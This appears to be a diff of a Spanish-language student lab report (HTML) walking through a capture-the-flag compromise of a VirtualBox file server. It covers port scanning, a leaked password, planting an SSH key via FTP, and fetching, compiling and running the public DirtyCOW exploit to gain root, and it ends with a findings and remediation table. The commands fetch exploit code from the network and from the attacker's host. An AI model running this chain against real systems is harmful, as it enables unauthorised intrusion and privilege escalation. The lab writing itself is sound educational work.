@@ -212,13 +212,476 @@
     <h2>Fases de Reconocimiento</h2>
     <h3>Identificación de la dirección IP de la víctima</h3>
 
-    <p>Se utilizó netdiscover en modo pasivo para escuchar tráfico ARP en la red
-       local y así identificar los hosts activos sin generar tráfico intrusivo. 
-       El escaneo reveló múltiples dispositivos en el segmento 172.26.58.0/16, entre 
-       ellos un host con MAC asociada al fabricante “PCS Systemtechnik GmbH” 
-       (VirtualBox), correspondiente a la máquina víctima en la dirección 192.168.1.
-       154.
+    <p>
+      Se utilizó netdiscover en modo pasivo para escuchar tráfico 
+      ARP en la red local y así identificar los hosts activos sin 
+      generar tráfico intrusivo. El escaneo reveló múltiples 
+      dispositivos en el segmento 192.168.56.0/24, entre ellos un 
+      host con MAC asociada al fabricante “PCS Systemtechnik GmbH” 
+      (VirtualBox), correspondiente a la máquina víctima en la 
+      dirección 192.168.56.104.
     </p>
+
+    <figure class="activity-figure">
+      <img src="../../assets/parcial-2/act13-1.jpg" alt="Salida de 'sudo netdiscover' mostrando la tabla de hosts detectados y resaltando la IP 192.168.56.104 de la máquina víctima">
+      <figcaption>Figura 1. Salida de 'sudo netdiscover' mostrando la tabla de hosts detectados y resaltando la IP 192.168.56.104 de la máquina víctima.</figcaption>
+    </figure>
+
+    <div class="code-block">
+      <div class="code-block__bar">
+        <span class="code-block__lang">bash</span>
+        <button class="code-block__copy" type="button" data-copy-target="codigoEjemplo1">Copiar</button>
+      </div>
+      <pre class="code-block__pre"><code id="codigoEjemplo1" class="code-block__code">$ sudo netdiscover</code></pre>
+    </div>
+
+    <h3>Escaneo de puertos y detección de versiones</h3>
+
+    <p>
+      Con la IP objetivo confirmada, se ejecutó un escaneo completo 
+      de puertos con Nmap utilizando el flag -sV para determinar la 
+      versión exacta de cada servicio, información indispensable 
+      para correlacionar vulnerabilidades conocidas más adelante.
+    </p>
+
+    <div class="code-block">
+      <div class="code-block__bar">
+        <span class="code-block__lang">bash</span>
+        <button class="code-block__copy" type="button" data-copy-target="codigoEjemplo2">Copiar</button>
+      </div>
+      <pre class="code-block__pre"><code id="codigoEjemplo2" class="code-block__code">$ nmap -p- 192.168.56.104 -sV</code></pre>
+    </div>
+
+    <figure class="activity-figure">
+      <img src="../../assets/parcial-2/act13-2.jpg" alt="Resultado de 'nmap -p- -sV' mostrando los puertos abiertos: 21/ftp (vsftpd 3.0.2), 22/ssh, 80/http, 111/rpcbind, 445/netbios-ssn (Samba), 2049/nfs_acl, 2121/ftp (ProFTPD) y 20048/mountd">
+      <figcaption>Figura 2. Resultado de 'nmap -p- -sV' mostrando los puertos abiertos: 21/ftp (vsftpd 3.0.2), 22/ssh, 80/http, 111/rpcbind, 445/netbios-ssn (Samba), 2049/nfs_acl, 2121/ftp (ProFTPD) y 20048/mountd.</figcaption>
+    </figure>
+
+    <p>
+      Posteriormente se ejecutó un escaneo agresivo (-A) para 
+      obtener detalles adicionales de cada servicio: scripts NSE, 
+      detección de sistema operativo y enumeración de RPC/NFS.
+    </p>
+
+    <div class="code-block">
+      <div class="code-block__bar">
+        <span class="code-block__lang">bash</span>
+        <button class="code-block__copy" type="button" data-copy-target="codigoEjemplo3">Copiar</button>
+      </div>
+      <pre class="code-block__pre"><code id="codigoEjemplo3" class="code-block__code">$ nmap -A 192.168.56.104</code></pre>
+    </div>
+
+    <figure class="activity-figure">
+      <img src="../../assets/parcial-2/act13-3.jpg" alt="Salida de 'nmap -A' detallando versiones de servicio: vsFTPd 3.0.2 (con FTP anónimo permitido), OpenSSH 7.4, Samba smbd 4.9.1 (smb-os-discovery) y traceroute hacia el objetivo">
+      <figcaption>Figura 3-1. Salida de 'nmap -A' detallando versiones de servicio: vsFTPd 3.0.2 (con FTP anónimo permitido), OpenSSH 7.4, Samba smbd 4.9.1 (smb-os-discovery) y traceroute hacia el objetivo.</figcaption>
+    </figure>
+
+    <figure class="activity-figure">
+      <img src="../../assets/parcial-2/act13-4.jpg" alt="Salida de 'nmap -A' detallando versiones de servicio: vsFTPd 3.0.2 (con FTP anónimo permitido), OpenSSH 7.4, Samba smbd 4.9.1 (smb-os-discovery) y traceroute hacia el objetivo">
+      <figcaption>Figura 3-2. Salida de 'nmap -A' detallando versiones de servicio: vsFTPd 3.0.2 (con FTP anónimo permitido), OpenSSH 7.4, Samba smbd 4.9.1 (smb-os-discovery) y traceroute hacia el objetivo.</figcaption>
+    </figure>
+
+    <!-- Tabla de ejemplo -->
+    <div class="activity-table-wrap">
+      <table class="activity-table">
+        <thead>
+          <tr>
+            <th scope="col">Puerto</th>
+            <th scope="col">Servicio</th>
+            <th scope="col">Versión detectada</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>21/tcp</td>
+            <td>ftp</td>
+            <td>vsftpd 3.0.2 (permite login anónimo)</td>
+          </tr>
+          <tr>
+            <td>22/tcp</td>
+            <td>ssh</td>
+            <td>OpenSSH 7.4 (protocol 2.0)</td>
+          </tr>
+          <tr>
+            <td>80/tcp</td>
+            <td>http</td>
+            <td>Apache httpd 2.4.6 (CentOS)</td>
+          </tr>
+          <tr>
+            <td>111/tcp</td>
+            <td>rpcbind</td>
+            <td>RPC #100000</td>
+          </tr>
+          <tr>
+            <td>445/tcp</td>
+            <td>microsoft-ds</td>
+            <td>Samba smbd 4.9.1 (workgroup: SAMBA)</td>
+          </tr>
+          <tr>
+            <td>2049/tcp</td>
+            <td>nfs</td>
+            <td>NFS 3/4 (RPC #100003)</td>
+          </tr>
+          <tr>
+            <td>2121/tcp</td>
+            <td>ftp</td>
+            <td>ProFTPD 1.3.5</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <h2>Enumeración</h2>
+    <h3>Servicio FTP (puerto 21)</h3>
+
+    <p>
+      Se intentó una conexión FTP estándar validando primero el 
+      acceso anónimo, funcionalidad que permite a cualquier usuario 
+      autenticarse sin credenciales válidas usando el usuario 
+      “anonymous”. Un segundo servicio FTP (ProFTPD) fue localizado 
+      en el puerto no estándar 2121; este también aceptó sesión 
+      anónima (“Anonymous access granted, restrictions apply”), 
+      aunque rechazó credenciales de usuarios del sistema como kali.
+    </p>
+
+    <div class="code-block">
+      <div class="code-block__bar">
+        <span class="code-block__lang">bash</span>
+        <button class="code-block__copy" type="button" data-copy-target="codigoEjemplo4">Copiar</button>
+      </div>
+      <pre class="code-block__pre"><code id="codigoEjemplo4" class="code-block__code">$ ftp 192.168.56.104
+$ ftp 192.168.56.104 2121
+</code></pre>
+    </div>
+
+    <figure class="activity-figure">
+      <img src="../../assets/parcial-2/act13-5.jpg" alt="Intentos de conexión FTP a los puertos 21 y 2121, confirmando el banner y comportamiento de vsFTPd 3.0.2 y ProFTPD 1.3.5 respectivamente">
+      <figcaption>Figura 4-1. Intentos de conexión FTP a los puertos 21 y 2121, confirmando el banner y comportamiento de vsFTPd 3.0.2 y ProFTPD 1.3.5 respectivamente.</figcaption>
+    </figure>
+
+    <figure class="activity-figure">
+      <img src="../../assets/parcial-2/act13-6.jpg" alt="Intentos de conexión FTP a los puertos 21 y 2121, confirmando el banner y comportamiento de vsFTPd 3.0.2 y ProFTPD 1.3.5 respectivamente">
+      <figcaption>Figura 4-2. Intentos de conexión FTP a los puertos 21 y 2121, confirmando el banner y comportamiento de vsFTPd 3.0.2 y ProFTPD 1.3.5 respectivamente.</figcaption>
+    </figure>
+
+    <div class="activity-callout">
+      Nmap ya había confirmado previamente: “ftp-anon: Anonymous 
+      FTP login allowed (FTP code 230)”, lo que adelantaba este 
+      hallazgo antes incluso de probarlo manualmente.
+    </div>
+
+    <h3>Servicio SMB / Samba (puerto 445)</h3>
+
+    <p>
+      Se accedió al recurso compartido vía navegador y se 
+      enumeraron los recursos SMB con smbmap, herramienta que 
+      permite listar shares, permisos efectivos y comentarios 
+      asociados sin necesidad de credenciales válidas si el 
+      servidor permite sesiones nulas o de invitado.
+    </p>
+
+    <div class="code-block">
+      <div class="code-block__bar">
+        <span class="code-block__lang">bash</span>
+        <button class="code-block__copy" type="button" data-copy-target="codigoEjemplo5">Copiar</button>
+      </div>
+      <pre class="code-block__pre"><code id="codigoEjemplo4" class="code-block__code">$ smbmap -H 192.168.56.104</code></pre>
+    </div>
+
+    <figure class="activity-figure">
+      <img src="../../assets/parcial-2/act13-7.jpg" alt="Salida de 'smbmap -H 192.168.56.104' listando los recursos compartidos: print$ (sin acceso), smbdata (READ, WRITE), smbuser (sin acceso) e IPC$ (sin acceso)">
+      <figcaption>Figura 5-1. Salida de 'smbmap -H 192.168.56.104' listando los recursos compartidos: print$ (sin acceso), smbdata (READ, WRITE), smbuser (sin acceso) e IPC$ (sin acceso).</figcaption>
+    </figure>
+
+    <figure class="activity-figure">
+      <img src="../../assets/parcial-2/act13-8.jpg" alt="Salida de 'smbmap -H 192.168.56.104' listando los recursos compartidos: print$ (sin acceso), smbdata (READ, WRITE), smbuser (sin acceso) e IPC$ (sin acceso)">
+      <figcaption>Figura 5-2. Salida de 'smbmap -H 192.168.56.104' listando los recursos compartidos: print$ (sin acceso), smbdata (READ, WRITE), smbuser (sin acceso) e IPC$ (sin acceso).</figcaption>
+    </figure>
+
+    <p>
+      El resultado reveló un recurso llamado “smbdata” con permisos 
+      de lectura y escritura, así como un recurso llamado “smbuser”, 
+      cuyo nombre coincide con un patrón común de cuenta de servicio 
+      por defecto un indicio de configuración débil que motivó 
+      continuar la enumeración hacia el servicio web.
+    </p>
+
+    <h3>Servicio web (puerto 80)</h3>
+
+    <p>
+      Se utilizó Nikto para enumerar directorios, archivos sensibles 
+      y configuraciones inseguras del servidor Apache.
+    </p>
+
+    <div class="code-block">
+      <div class="code-block__bar">
+        <span class="code-block__lang">bash</span>
+        <button class="code-block__copy" type="button" data-copy-target="codigoEjemplo6">Copiar</button>
+      </div>
+      <pre class="code-block__pre"><code id="codigoEjemplo6" class="code-block__code">$ nikto -h 192.168.56.104</code></pre>
+    </div>
+
+    <figure class="activity-figure">
+      <img src="../../assets/parcial-2/act13-9.jpg" alt="Salida de Nikto identificando el archivo '/readme.txt' como potencialmente interesante y confirmando que el método HTTP TRACE está habilitado">
+      <figcaption>Figura 6-1. Salida de Nikto identificando el archivo '/readme.txt' como potencialmente interesante y confirmando que el método HTTP TRACE está habilitado.</figcaption>
+    </figure>
+
+    <figure class="activity-figure">
+      <img src="../../assets/parcial-2/act13-10.jpg" alt="Salida de Nikto identificando el archivo '/readme.txt' como potencialmente interesante y confirmando que el método HTTP TRACE está habilitado">
+      <figcaption>Figura 6-2. Salida de Nikto identificando el archivo '/readme.txt' como potencialmente interesante y confirmando que el método HTTP TRACE está habilitado.</figcaption>
+    </figure>
+
+    <p>
+      Al acceder directamente al archivo señalado por Nikto se 
+      encontró información de credenciales expuesta públicamente en 
+      el sitio web, sin ningún control de acceso:
+    </p>
+
+    <figure class="activity-figure">
+      <img src="../../assets/parcial-2/act13-11.jpg" alt="Figura 7. Captura del navegador mostrando el contenido de http://192.168.56.104/readme.txt: “My Password is rootroot1”">
+      <figcaption>Figura 7. Captura del navegador mostrando el contenido de http://192.168.56.104/readme.txt: “My Password is rootroot1”.</figcaption>
+    </figure>
+
+    <div class="activity-callout">
+      Credenciales obtenidas Usuario: smbuser   |   Contraseña: 
+      rootroot1. Este único archivo mal configurado fue el punto de 
+      apoyo para toda la cadena de explotación posterior.
+    </div>
+
+    <h2>Explotación</h2>
+
+    <p>
+      Con el acceso FTP anónimo y con escritura sobre el share 
+      “smbdata” confirmados, se diseñó una cadena de ataque para 
+      obtener una sesión interactiva por SSH sin necesidad de 
+      contraseña, abusando de la autenticación basada en llaves 
+      públicas.
+    </p>
+
+    <h3>Generación del par de llaves SSH</h3>
+
+    <p>
+      En la máquina atacante (Kali Linux) se generó un par de 
+      llaves ED25519 sin passphrase con ssh-keygen. La llave 
+      pública sería posteriormente entregada al servidor víctima.
+    </p>
+
+    <div class="code-block">
+      <div class="code-block__bar">
+        <span class="code-block__lang">bash</span>
+        <button class="code-block__copy" type="button" data-copy-target="codigoEjemplo7">Copiar</button>
+      </div>
+      <pre class="code-block__pre"><code id="codigoEjemplo7" class="code-block__code">$ sudo ssh-keygen</code></pre>
+    </div>
+
+    <figure class="activity-figure">
+      <img src="../../assets/parcial-2/act13-12.jpg" alt="Ejecución de 'ssh-keygen' generando el par de llaves ED25519 (id_ed25519 / id_ed25519.pub)">
+      <figcaption>Figura 8. Ejecución de 'ssh-keygen' generando el par de llaves ED25519 (id_ed25519 / id_ed25519.pub).</figcaption>
+    </figure>
+
+    <h3>Entrega de la llave pública vía FTP anónimo</h3>
+
+    <p>
+      Se inició sesión FTP con el usuario recién descubierto 
+      (smbuser) y, dentro del directorio home del usuario, se creó 
+      la carpeta oculta .ssh. Acto seguido, se cargó el archivo 
+      id_ed25519.pub renombrándolo como authorized_keys, el nombre 
+      que OpenSSH espera para autenticación por llave pública. Es 
+      importante generar/usar la llave con el usuario normal (sin 
+      sudo), ya que el cliente FTP no tiene permisos para leer 
+      llaves propiedad de root.
+    </p>
+
+    <div class="code-block">
+      <div class="code-block__bar">
+        <span class="code-block__lang">bash</span>
+        <button class="code-block__copy" type="button" data-copy-target="codigoEjemplo8">Copiar</button>
+      </div>
+      <pre class="code-block__pre"><code id="codigoEjemplo8" class="code-block__code">$ ftp 192.168.56.104
+Name: smbuser
+ftp> mkdir .ssh
+ftp> cd .ssh
+ftp> put /home/kali/.ssh/id_ed25519.pub authorized_keys
+</code></pre>
+    </div>
+
+    <figure class="activity-figure">
+      <img src="../../assets/parcial-2/act13-13.jpg" alt="Secuencia de comandos FTP: inicio de sesión como smbuser, creación del directorio .ssh y transferencia exitosa de 'authorized_keys' (91 bytes)">
+      <figcaption>Figura 9. Secuencia de comandos FTP: inicio de sesión como smbuser, creación del directorio .ssh y transferencia exitosa de 'authorized_keys' (91 bytes).</figcaption>
+    </figure>
+
+    <h3>Acceso inicial vía SSH</h3>
+
+    <p>
+      Con la llave pública ya instalada como credencial autorizada, 
+      se estableció una conexión SSH hacia el servidor utilizando 
+      la llave privada correspondiente, obteniendo una sesión de 
+      shell interactiva como el usuario smbuser sin necesidad de 
+      conocer o adivinar ninguna contraseña adicional.
+    </p>
+
+    <div class="code-block">
+      <div class="code-block__bar">
+        <span class="code-block__lang">bash</span>
+        <button class="code-block__copy" type="button" data-copy-target="codigoEjemplo9">Copiar</button>
+      </div>
+      <pre class="code-block__pre"><code id="codigoEjemplo9" class="code-block__code">$ ssh smbuser@192.168.56.104</code></pre>
+    </div>
+
+    <figure class="activity-figure">
+      <img src="../../assets/parcial-2/act13-14.jpg" alt="Conexión SSH exitosa mostrando el banner del servidor (“Armour Infosec  My File Server - 1”) y el prompt [smbuser@fileserver ~]$">
+      <figcaption>Figura 10. Conexión SSH exitosa mostrando el banner del servidor (“Armour Infosec  My File Server - 1”) y el prompt [smbuser@fileserver ~]$.</figcaption>
+    </figure>
+
+    <div class="activity-callout">
+      Punto de control: en este momento el atacante ya cuenta con 
+      acceso inicial persistente (shell) al sistema, partiendo 
+      únicamente de servicios mal configurados y sin haber requerido 
+      explotación de código ni fuerza bruta.
+    </div>
+
+    <h2>Escalada de Privilegios</h2>
+    <h3>Identificación de la versión del kernel</h3>
+
+    <p>
+      Una vez dentro del sistema como usuario de bajos privilegios, 
+      el primer paso de post-explotación fue determinar la versión 
+      exacta del sistema operativo y del kernel para buscar 
+      vulnerabilidades locales de escalada de privilegios conocidas.
+    </p>
+
+    <div class="code-block">
+      <div class="code-block__bar">
+        <span class="code-block__lang">bash</span>
+        <button class="code-block__copy" type="button" data-copy-target="codigoEjemplo10">Copiar</button>
+      </div>
+      <pre class="code-block__pre"><code id="codigoEjemplo10" class="code-block__code">$ uname -a</code></pre>
+    </div>
+
+    <figure class="activity-figure">
+      <img src="../../assets/parcial-2/act13-15.jpg" alt="Salida de 'uname -a': Linux fileserver 3.10.0-229.el7.x86_64 #1 SMP Fri Mar 6 2015  CentOS 7">
+      <figcaption>Figura 11. Salida de 'uname -a': Linux fileserver 3.10.0-229.el7.x86_64 #1 SMP Fri Mar 6 2015  CentOS 7.</figcaption>
+    </figure>
+
+    <p>
+      La versión de kernel 3.10.0-229 (CentOS 7, compilado en 2015) 
+      corresponde a una rama afectada por CVE-2016-5195, conocida 
+      públicamente como “DirtyCOW”, una condición de carrera en el 
+      subsistema de memoria del kernel de Linux relacionada con el 
+      manejo de copy-on-write en mapeos de memoria privados de solo 
+      lectura.
+    </p>
+
+    <h3>Obtención y compilación del exploit</h3>
+
+    <p>
+      Se descargó el código fuente público del exploit DirtyCOW 
+      (40616.c) directamente en Kali desde el repositorio de GitHub. 
+      El primer intento falló por un error temporal de resolución de 
+      DNS; al reintentar, la descarga se completó correctamente.
+    </p>
+
+    <div class="code-block">
+      <div class="code-block__bar">
+        <span class="code-block__lang">bash</span>
+        <button class="code-block__copy" type="button" data-copy-target="codigoEjemplo11">Copiar</button>
+      </div>
+      <pre class="code-block__pre"><code id="codigoEjemplo11" class="code-block__code">$ wget https://raw.githubusercontent.com/SecWiki/linux-kernel-exploits/master/2016/CVE-2016-5195/40616.c</code></pre>
+    </div>
+
+    <p>
+      Dado que la máquina víctima no tiene salida directa a internet, 
+      se levantó un servidor HTTP temporal en Kali para servir el 
+      archivo dentro de la red host-only, y desde la sesión SSH ya 
+      establecida en la víctima se descargó el exploit apuntando a la 
+      IP de Kali en esa red.
+    </p>
+
+    <div class="code-block">
+      <div class="code-block__bar">
+        <span class="code-block__lang">bash</span>
+        <button class="code-block__copy" type="button" data-copy-target="codigoEjemplo12">Copiar</button>
+      </div>
+      <pre class="code-block__pre"><code id="codigoEjemplo12" class="code-block__code"># En Kali:
+$ python3 -m http.server 8080
+# En la víctima (sesión SSH):
+$ wget http://192.168.56.101:8080/40616.c
+$ gcc 40616.c -o upslp -pthread
+</code></pre>
+    </div>
+
+    <figure class="activity-figure">
+      <img src="../../assets/parcial-2/act13-16.jpg" alt="Secuencia completa de obtención del exploit: descarga en Kali desde GitHub, servidor HTTP local, descarga desde la víctima y compilación exitosa con gcc, generando el binario ejecutable 'upslp'">
+      <figcaption>Figura 12-1. Secuencia completa de obtención del exploit: descarga en Kali desde GitHub, servidor HTTP local, descarga desde la víctima y compilación exitosa con gcc, generando el binario ejecutable 'upslp'.</figcaption>
+    </figure>
+
+    <figure class="activity-figure">
+      <img src="../../assets/parcial-2/act13-17.jpg" alt="Secuencia completa de obtención del exploit: descarga en Kali desde GitHub, servidor HTTP local, descarga desde la víctima y compilación exitosa con gcc, generando el binario ejecutable 'upslp'">
+      <figcaption>Figura 12-2. Secuencia completa de obtención del exploit: descarga en Kali desde GitHub, servidor HTTP local, descarga desde la víctima y compilación exitosa con gcc, generando el binario ejecutable 'upslp'.</figcaption>
+    </figure>
+
+    <figure class="activity-figure">
+      <img src="../../assets/parcial-2/act13-18.jpg" alt="Secuencia completa de obtención del exploit: descarga en Kali desde GitHub, servidor HTTP local, descarga desde la víctima y compilación exitosa con gcc, generando el binario ejecutable 'upslp'">
+      <figcaption>Figura 12-3. Secuencia completa de obtención del exploit: descarga en Kali desde GitHub, servidor HTTP local, descarga desde la víctima y compilación exitosa con gcc, generando el binario ejecutable 'upslp'.</figcaption>
+    </figure>
+
+    <figure class="activity-figure">
+      <img src="../../assets/parcial-2/act13-19.jpg" alt="Secuencia completa de obtención del exploit: descarga en Kali desde GitHub, servidor HTTP local, descarga desde la víctima y compilación exitosa con gcc, generando el binario ejecutable 'upslp'">
+      <figcaption>Figura 12-4. Secuencia completa de obtención del exploit: descarga en Kali desde GitHub, servidor HTTP local, descarga desde la víctima y compilación exitosa con gcc, generando el binario ejecutable 'upslp'.</figcaption>
+    </figure>
+
+    <h3>Ejecución del exploit y obtención de shell root</h3>
+
+    <p>
+      Al ejecutar el binario compilado, el exploit realiza un 
+      respaldo del binario /usr/bin/passwd, explota la condición de 
+      carrera para sobrescribirlo con una versión modificada con el 
+      bit SUID, y finalmente entrega una shell con privilegios de 
+      root.
+    </p>
+
+    <div class="code-block">
+      <div class="code-block__bar">
+        <span class="code-block__lang">bash</span>
+        <button class="code-block__copy" type="button" data-copy-target="codigoEjemplo13">Copiar</button>
+      </div>
+      <pre class="code-block__pre"><code id="codigoEjemplo13" class="code-block__code">$ ./upslp</code></pre>
+    </div>
+
+    <figure class="activity-figure">
+      <img src="../../assets/parcial-2/act13-20.jpg" alt="Ejecución de './upslp' mostrando el proceso de “race condition”, el mensaje “Popping root shell” y el prompt final [root@fileserver smbuser]#">
+      <figcaption>Figura 13. Ejecución de './upslp' mostrando el proceso de “race condition”, el mensaje “Popping root shell” y el prompt final [root@fileserver smbuser]#.</figcaption>
+    </figure>
+
+    <p>
+      Con la shell de root obtenida, se confirmó el control total 
+      del sistema accediendo al directorio del superusuario y 
+      leyendo el archivo de prueba (flag) del CTF.
+    </p>
+
+    <div class="code-block">
+      <div class="code-block__bar">
+        <span class="code-block__lang">bash</span>
+        <button class="code-block__copy" type="button" data-copy-target="codigoEjemplo14">Copiar</button>
+      </div>
+      <pre class="code-block__pre"><code id="codigoEjemplo14" class="code-block__code">$ cd /root
+$ ls
+$ cat proof.txt
+</code></pre>
+    </div>
+
+    <figure class="activity-figure">
+      <img src="../../assets/parcial-2/act13-21.jpg" alt="Comandos ejecutados como root confirmando acceso al directorio /root y lectura del archivo proof.txt (“Best of Luck” / af52e0163b03cbf7c6dd146351594a43), evidencia final del compromiso total del sistema">
+      <figcaption>Figura 14. Comandos ejecutados como root confirmando acceso al directorio /root y lectura del archivo proof.txt (“Best of Luck” / af52e0163b03cbf7c6dd146351594a43), evidencia final del compromiso total del sistema.</figcaption>
+    </figure>
+
+    <div class="activity-callout">
+      Resultado: escalada de privilegios exitosa de usuario sin 
+      privilegios (smbuser) a root, mediante CVE-2016-5195. El 
+      atacante posee ahora control absoluto sobre el sistema 
+      operativo, sus archivos y sus procesos.
+    </div>
+
 
     <h2>Análisis de Impacto (Modelo CIA)</h2>
 
@@ -319,49 +782,49 @@
             <td>H-01</td>
             <td>Exposición de credenciales en archivo público del servidor web (readme.txt)</td>
             <td>Crítica</td>
-            <td>Crítica</td>
-            <td>Crítica</td>
-            <td>Crítica</td>
+            <td>Fig. 6–7 · Nikto + navegador → /readme.txt</td>
+            <td>Credenciales válidas (smbuser) reutilizables en FTP, SMB y SSH; punto de entrada de toda la cadena de ataque.</td>
+            <td>Eliminar archivos sensibles del webroot; gestión segura de secretos y rotación de credenciales.</td>
           </tr>
           <tr>
-            <td>Integridad</td>
-            <td>Alto</td>
-            <td>El acceso de escritura vía FTP/SMB permite modificar o sustituir archivos; el acceso root demostrado permite alterar binarios del sistema (se sobrescribió /usr/bin/passwd durante la explotación), configuraciones y registros.</td>
+            <td>H-02</td>
+            <td>Kernel Linux desactualizado vulnerable a DirtyCOW (CVE-2016-5195)</td>
             <td>Crítica</td>
-            <td>Crítica</td>
-            <td>Crítica</td>
+            <td>Fig. 11–14 · uname -a + exploit 40616.c ejecutado como root</td>
+            <td>Escalada de privilegios de usuario local a root; compromiso total del sistema (C, I y D).</td>
+            <td>Actualizar el kernel a versión parchada; gestión periódica de parches y monitoreo de CVEs críticos.</td>
           </tr>
           <tr>
-            <td>Disponibilidad</td>
-            <td>Medio</td>
-            <td>No se ejecutaron ataques de denegación de servicio durante la prueba, pero el control root obtenido habilita a un atacante real a detener servicios, eliminar datos o desplegar ransomware, por lo que el riesgo latente es significativo.</td>
-            <td>Crítica</td>
-            <td>Crítica</td>
-            <td>Crítica</td>
+            <td>H-03</td>
+            <td>Acceso FTP anónimo con permisos de escritura (vsftpd 3.0.2)</td>
+            <td>Alta</td>
+            <td>Fig. 1–4 · nmap ftp-anon + conexión FTP anónima exitosa</td>
+            <td>Permite subir archivos arbitrarios al servidor, incluyendo la llave usada para pivotar a SSH.</td>
+            <td>Deshabilitar el login anónimo o limitarlo a solo lectura; aplicar mínimo privilegio en directorios.</td>
           </tr>
           <tr>
-            <td>Integridad</td>
-            <td>Alto</td>
-            <td>El acceso de escritura vía FTP/SMB permite modificar o sustituir archivos; el acceso root demostrado permite alterar binarios del sistema (se sobrescribió /usr/bin/passwd durante la explotación), configuraciones y registros.</td>
-            <td>Crítica</td>
-            <td>Crítica</td>
-            <td>Crítica</td>
+            <td>H-04</td>
+            <td>Recursos SMB con acceso de invitado y permisos de escritura (Samba 4.9.1)</td>
+            <td>Alta</td>
+            <td>Fig. 5 · smbmap muestra share “smbdata” en READ, WRITE</td>
+            <td>Permite enumeración de usuarios y modificación no autorizada de archivos compartidos.</td>
+            <td>Exigir autenticación, deshabilitar acceso invitado, revisar permisos por usuario/grupo.</td>
           </tr>
           <tr>
-            <td>Integridad</td>
-            <td>Alto</td>
-            <td>El acceso de escritura vía FTP/SMB permite modificar o sustituir archivos; el acceso root demostrado permite alterar binarios del sistema (se sobrescribió /usr/bin/passwd durante la explotación), configuraciones y registros.</td>
-            <td>Crítica</td>
-            <td>Crítica</td>
-            <td>Crítica</td>
+            <td>H-05</td>
+            <td>Escalada de acceso vía subida de llave pública SSH por FTP (encadenamiento)</td>
+            <td>Alta</td>
+            <td>Fig. 8–10 · mkdir .ssh + put authorized_keys + ssh login sin contraseña</td>
+            <td>Concede shell interactiva persistente sin necesidad de contraseña válida.</td>
+            <td>Restringir escritura del FTP sobre directorios de usuario (incl. .ssh); aislar el servicio en chroot.</td>
           </tr>
           <tr>
-            <td>Integridad</td>
-            <td>Alto</td>
-            <td>El acceso de escritura vía FTP/SMB permite modificar o sustituir archivos; el acceso root demostrado permite alterar binarios del sistema (se sobrescribió /usr/bin/passwd durante la explotación), configuraciones y registros.</td>
-            <td>Crítica</td>
-            <td>Crítica</td>
-            <td>Crítica</td>
+            <td>H-06</td>
+            <td>Método HTTP TRACE habilitado en Apache</td>
+            <td>Baja</td>
+            <td>Fig. 6 · Nikto reporta “HTTP TRACE method is active”</td>
+            <td>Podría facilitar ataques de Cross-Site Tracing (XST) combinados con XSS.</td>
+            <td>Deshabilitar TRACE en la configuración de Apache (TraceEnable off).</td>
           </tr>
         </tbody>
       </table>
@@ -401,14 +864,14 @@
 </main>
 
 <div class="activity-download">
-  <a class="btn btn--pdf" href="../../assets/parcial-2/LARZ ACT14.pdf" download>
+  <a class="btn btn--pdf" href="../../assets/parcial-2/LARZ ACT13.pdf" download>
     <svg width="16" height="16" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M12 3v12m0 0 4-4m-4 4-4-4" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/><path d="M4 17v2a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-2" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/></svg>
     Descargar PDF
   </a>
   <p class="activity-download__note">Documento entregable en formato PDF.</p>
 </div>
 <div class="activity-download">
-  <a class="btn btn--pdf" href="../../assets/parcial-2/LARZ ACT14.pdf" download>
+  <a class="btn btn--pdf" href="../../assets/parcial-2/LARZ ACT13 PC.pdf" download>
     <svg width="16" height="16" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M12 3v12m0 0 4-4m-4 4-4-4" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/><path d="M4 17v2a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-2" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/></svg>
     Descargar PDF
   </a>
